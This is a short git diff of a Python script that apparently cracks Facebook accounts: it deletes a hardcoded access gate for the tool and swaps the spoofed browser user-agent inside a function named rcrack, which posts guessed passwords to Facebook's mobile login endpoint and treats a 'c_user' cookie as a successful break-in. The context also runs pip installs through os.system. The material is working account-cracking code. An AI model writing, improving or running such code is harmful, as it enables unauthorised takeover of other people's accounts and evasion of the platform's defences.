@@ -40,24 +40,6 @@ except ModuleNotFoundError:
     os.system('pip install mechanize requests futures bs4==2 > /dev/null')
     os.system('pip install bs4')
     
-import getpass
-
-attemps = 0
-
-while attemps < 12345677901:
-    username = input('\033[1;92mUser Name:\033[1;37m ')
-    password = input('\033[1;92mPassword:\033[1;37m ')
-
-    if username == 'gsxd143' and password == 'gsxd143':    	
-        print('\033[1;92mYou have successfully logged in.')
-        break
-    else:
-        print('\033[91;1mIncorrect Please Trying ')
-        #def pw():
-        attemps += 1
-        continue
-os.system('clear')
-
 class jalan:
     def __init__(self, z):
         for e in z + "\n":
@@ -290,7 +272,7 @@ def rcrack(uid,pwx,tl):
 		    'sec-fetch-site': 'none',
 		    'sec-fetch-user': '?1',
    		 'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3',}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; NEO-U9-H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36 OPR/63.3.3216.58675',}
             lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
